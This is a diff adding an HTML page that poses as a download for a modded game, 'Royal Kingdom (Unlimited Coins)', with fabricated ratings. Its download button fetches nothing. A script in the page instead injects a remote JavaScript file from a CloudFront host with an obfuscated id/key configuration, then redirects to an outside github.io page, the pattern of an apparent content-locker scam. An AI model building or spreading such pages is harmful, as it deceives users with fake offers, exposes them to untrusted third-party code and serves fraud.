@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Download Royal Kingdom</title>
+  <style>
+    body { margin: 0; background-color: #0d1117; font-family: 'Segoe UI', sans-serif; color: #ffffff; }
+    .header { display: flex; justify-content: center; background-color: #161b22; padding: 15px 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+    .header img { height: 35px; }
+    .container { max-width: 420px; margin: 0 auto; padding: 20px; }
+    .card { background-color: #161b22; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); margin-bottom: 20px; }
+    .card img { width: 100%; height: auto; }
+    .card-content { padding: 16px; }
+    .title { font-size: 22px; font-weight: bold; margin-bottom: 6px; }
+    .rating { color: #facc15; font-size: 14px; margin-bottom: 10px; }
+    .info { display: flex; justify-content: space-between; font-size: 14px; color: #c9d1d9; margin-bottom: 16px; }
+    .tag { background-color: #30363d; padding: 5px 10px; border-radius: 8px; }
+    .description, .features li { font-size: 14px; color: #d1d5db; line-height: 1.6; }
+    .download-btn { width: 100%; text-align: center; background: linear-gradient(to right, #0ea5e9, #3b82f6); color: #fff; padding: 12px; font-size: 16px; border: none; border-radius: 10px; text-decoration: none; cursor: pointer; margin-top: 10px; }
+    .download-btn:hover { background: linear-gradient(to right, #0284c7, #2563eb); }
+    .screenshot img { width: 100%; display: block; border-radius: 12px; }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://i.postimg.cc/sXR1112v/20250513-234241.png" alt="Logo" />
+  </div>
+
+  <div class="container">
+    <div class="card">
+      <img src="https://i.postimg.cc/63Q2QHKb/royal-kingdom-art.jpg" alt="Royal Kingdom Cover" />
+      <div class="card-content">
+        <div class="title">Royal Kingdom (Unlimited Coins)</div>
+        <div class="rating">⭐ 4.6 (3.9k reviews)</div>
+        <div class="info">
+          <span class="tag">Strategy</span>
+          <span>200 MB</span>
+        </div>
+        <div class="description">
+          Rule your own medieval empire! Construct buildings, gather resources, and protect your land.
+        </div>
+        <ul class="features">
+          <li>✨ Build and expand your kingdom</li>
+          <li>⚔️ Defend your land</li>
+          <li>👑 Unlock legendary heroes</li>
+          <li>💰 Manage resources</li>
+        </ul>
+        <a href="#" class="download-btn" onclick="showLocker('royal-kingdom')">Download Game</a>
+      </div>
+    </div>
+    <div class="screenshot">
+      <img src="https://i.postimg.cc/TwxfPhXk/royal-kingdom-1-jpg-820.jpg" alt="Gameplay" />
+    </div>
+  </div>
+
+  <script>
+    function showLocker(gameId) {
+      localStorage.setItem('unlockGame', gameId);
+      var rLWsv_aOL_ckUBRc = { "it": 4494032, "key": "56a6f" };
+      var script = document.createElement('script');
+      script.src = 'https://d2yc6hxtq0phup.cloudfront.net/4351b50.js';
+      script.onload = function() {
+        window.location.href = 'https://mavericksgames.github.io/Neo/redirect.html';
+      };
+      document.body.appendChild(script);
+    }
+  </script>
+</body>
+</html>
